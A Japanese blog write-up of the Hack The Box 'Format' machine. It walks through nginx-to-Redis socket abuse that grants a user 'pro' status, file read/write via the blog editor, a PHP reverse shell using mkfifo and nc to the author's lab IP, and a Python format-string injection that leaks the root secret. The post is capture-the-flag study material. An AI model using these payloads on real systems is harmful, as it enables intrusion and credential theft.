---
title: "【Hack The Box】Format - Medium【writeup】"
emoji: "🐙"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["hackthebox", "htb"]
published: true
---

## はじめに

Hack The Box の Retired Machine （解いた当時は Active だった）の Format を解いたので、その writeup を記します。Machine Info Card は次の通りです。

![](https://storage.googleapis.com/zenn-user-upload/b353d53c8ba8-20231001.png)

## IP アドレス

ターゲット：10.10.11.213
自分：10.10.14.96

## ポートスキャン

まずは `nmap` でポートスキャンをしました。ssh （22 番）と http（80 番と 3000 番）がオープンでした。また、`OpenSSH` や `nginx` のバージョンも特に問題なさそうでした。

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.10.11.213
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-28 19:40 JST
Nmap scan report for 10.10.11.213
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA)
|   256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA)
|_  256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
3000/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.88 seconds
```

## /etc/hosts

判明しているホスト名を `/etc/hosts` に追加しました。

```
10.10.11.213    microblog.htb
10.10.11.213    app.microblog.htb
```

## app.microblog.htb

まずは、80 番の方の http にアクセスしました。

![](https://storage.googleapis.com/zenn-user-upload/cfe7920f2352-20231001.png)

Login と Register には脆弱性は見つかりませんでした。一旦、適当なユーザ `tyo` を作成してログインしました。

![](https://storage.googleapis.com/zenn-user-upload/b85ac44904d8-20231001.png)

どうやら、ブログページを作成できるようなので、`tyo.microblog.htb` を作成しました。また、これを `/etc/hosts` に追記しました。

```
10.10.11.213    tyo.microblog.htb
```

作成すると `Visit Site` と `Edit Site` の欄が出てきました。Visit の方は特に何もなかったので、Edit のページを示します。`h1` と `txt` に文字を入力できるようです。

![](https://storage.googleapis.com/zenn-user-upload/3699be02600b-20231001.png)

## microblog.htb

次に、3000 番の方の http にアクセスしました。そのページを見てみると、ブログのソースコードがありました。ちなみに、このページは `app.microblog.htb` にあるリンクからも飛べます。

![](https://storage.googleapis.com/zenn-user-upload/0d966373a073-20231001.png)

ソースコードの要点は次の通りです。

- ユーザには Pro という権限があり、画像のアップロード機能が解禁される

- データベースに Redis を使用している

Pro かどうかの判定は次のように行われています。`pro` は `true` か `false` となっており、デフォルトでは `false` となっています。

```php
function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}
```

```php:microblog/register/index.php
$redis->HSET(trim($_POST['username']), "pro", "false"); //not ready yet, license keys coming soon
```

また、Pro になると権限のゆるい `/var/www/microblog/$blogName/uploads` が使えます。

```php:microblog/sunny/edit/index.php
function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}
```

以上のことから、次のような攻撃方針を立てました。

1. ユーザの権限を Pro にする
2. `/var/www/microblog/$blogName/uploads` に攻撃用の PHP ファイルを置く

## Pro になる

nginx と Redis について調べていたら、次の記事がヒットしました。

https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/

この記事の内容を使って頑張ることで、`pro` を `true` にできました。レスポンスは 502 ですが、攻撃は成功していました。

```
┌──(kali㉿kali)-[~]
└─$ curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:tyo%20pro%20true%20/a"
<html>
<head><title>502 Bad Gateway</title></head>
<body>
<center><h1>502 Bad Gateway</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
```

![](https://storage.googleapis.com/zenn-user-upload/551cfd8221dc-20231001.png)

## Local File read/write

色々と試してみたところ、`h1` の POST で `id` にファイル名を入れると読み取れることがわかりました。下の例は `/etc/passwd` を読み取ってみたものです。

![](https://storage.googleapis.com/zenn-user-upload/d872bff66792-20231001.png)

![](https://storage.googleapis.com/zenn-user-upload/14d8448f1a97-20231001.png)

他に書き込みもできないかどうか試したところ、`header` に内容を書き込めることがわかりました。次の例は `uploads` に `exe.php` というファイルを作成し、`id` を実行したものです。

![](https://storage.googleapis.com/zenn-user-upload/017cc3714a00-20231001.png)

![](https://storage.googleapis.com/zenn-user-upload/1179e2ddcdc0-20231001.png)

## リバースシェル

`uploads` にファイルを書き込めるようになったので、リバースシェルで接続します。色々と試してみたところ、次の PHP で上手くいきました。

```php
<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.96 1234 >/tmp/f");?>
```

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.96] from (UNKNOWN) [10.10.11.213] 40722
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## user.txt

`www-data`に接続できましたが、このままでは `user.txt` を見ることはできません。

```
$ cat /home/cooper/user.txt
cat: /home/cooper/user.txt: Permission denied
```

ここで、データベースが Redis だったことを思い出し、データベースに接続してみました。以下の結果は、出力を見やすくするために改行や `>` を追加したものです。この結果から、`cooper` のパスワードが `zooperdoopercooper` だと判明しました。

```
$ redis-cli -s /var/run/redis/redis.sock
> KEYS *
PHPREDIS_SESSION:ud9jgn24eoid2n2so6t8nric63
cooper.dooper:sites
mateor
PHPREDIS_SESSION:m4d8nqvmm9vjgso8btf1rstm9c
tyo
tyo:sites
cooper.dooper

> HGETALL cooper.dooper
username
cooper.dooper
password
zooperdoopercooper
first-name
Cooper
last-name
Dooper
pro
false
```

`cooper` に SSH 接続すると `user.txt` を見ることができました。

```
┌──(kali㉿kali)-[~]
└─$ ssh cooper@10.10.11.213
cooper@10.10.11.213's password:
Linux format 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct  1 15:26:37 2023 from 10.10.14.14
cooper@format:~$ ls
user.txt
```

## 権限昇格

`sudo -l` で怪しいコマンド `license` を発見しました。

```
cooper@format:~$ sudo -l
[sudo] password for cooper:
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license
```

`license` の中身を見てみると、Python のプログラムでした。

```
cooper@format:~$ file /usr/bin/license
/usr/bin/license: Python script, ASCII text executable
```

```python:/usr/bin/license
#!/usr/bin/python3
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys
class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()
if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()
parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()
r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')
secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))
f = Fernet(encryption_key)
l = License()
#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")
#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()
#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")
```

使い方は次の通りです。ソースコードを読むと、`-d` は未実装です。

```
cooper@format:~$ sudo license -h
usage: license [-h] (-p username | -d username | -c license_key)

Microblog license key manager

optional arguments:
  -h, --help            show this help message and exit
  -p username, --provision username
                        Provision license key for specified user
  -d username, --deprovision username
                        Deprovision license key for specified user
  -c license_key, --check license_key
                        Check if specified license key is valid
```

試しに実行してみるとこのようになりました。

```
cooper@format:~$ sudo license -p tyo

Plaintext license key:
------------------------------------------------------
microblogtyo@h/,>{)B*XJ3rcd3Bytab)<kcp`+]jd%20^}cKl8aaaa

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABlGVSzBQRODqOTPimT_H18AD8ZEJA_O4cePzZKWd2hquKs60PtnnkMGr3_r4R1SrwMiIDKN_gvvb4xIQTAt9XI9kU-nXI7rUlz0qSz0NlavQC4NmpJVh2Jqy_YagVGIAsAq1cZwXIGkQWAdYef45o8Y10wSQ==
```

`/usr/bin/license` のソースコードを読んでみると、怪しい `format` がありました。

```python
license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
```

このページを参考にすると、`secret` 変数の中身を見ることができました。

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python-format-string

実際には次の内容を `username` にセットしました。

```python
{license.__init__.__globals__[secret]}
```

Redis で上記の `username` を持つ適当なユーザ `testC` を作成しました。

```
cooper@format:~$ redis-cli -s /var/run/redis/redis.sock
redis /var/run/redis/redis.sock> HSET testC username {license.__init__.__globals__[secret]}
(integer) 1
redis /var/run/redis/redis.sock> HSET testC first-name a
(integer) 1
redis /var/run/redis/redis.sock> HSET testC last-name a
(integer) 1
```

実行してみると、`secret` が `unCR4ckaBL3Pa$$w0rd` だと判明しました。

```
cooper@format:~$ sudo license -p testC

Plaintext license key:
------------------------------------------------------
microblogunCR4ckaBL3Pa$$w0rdcchh!uRu:,7;TaLNRA*Wz4GPaCF"|Q##Tz=EZ?5Baa

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABlGVq3hiJu-p7y7Xwwqsu9DBwWnRbU3ioi3XgTI0h0zJZ662x4szk4JkBpIpuyPgdj9ltk3vhS5E7LpyackWAguBFDX_aswbCbeOMEz_q6CZmTcgAi9qO_ndDhhGmUvjv3SrjquBvScuw2MQ1FOCcGrAP1EaIGjwkrSAuNn_2Q1l1ILDg=
```

得られた `secret` をパスワードにすると、`root` に SSH 接続できました。

```
┌──(kali㉿kali)-[~]
└─$ ssh root@10.10.11.213
root@10.10.11.213's password:
Linux format 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct  1 03:03:00 2023 from 10.10.16.111
root@format:~# ls
license  reset  root.txt
```

## 終わりに

全体的に面白く、とても勉強になる Machine でした。攻略難易度は、ユーザフラグを手に入れるまでが難しく、それ以降は比較的簡単でした。この writeup ではあっさり書いていますが、実はユーザフラグまでの脆弱性を見つけるのに非常に苦戦し、Local File read/write に長時間気付けませんでした。どの Machine もそうですが、最初の取っ掛かりとなる脆弱性を見つけることは大変ですね 😭
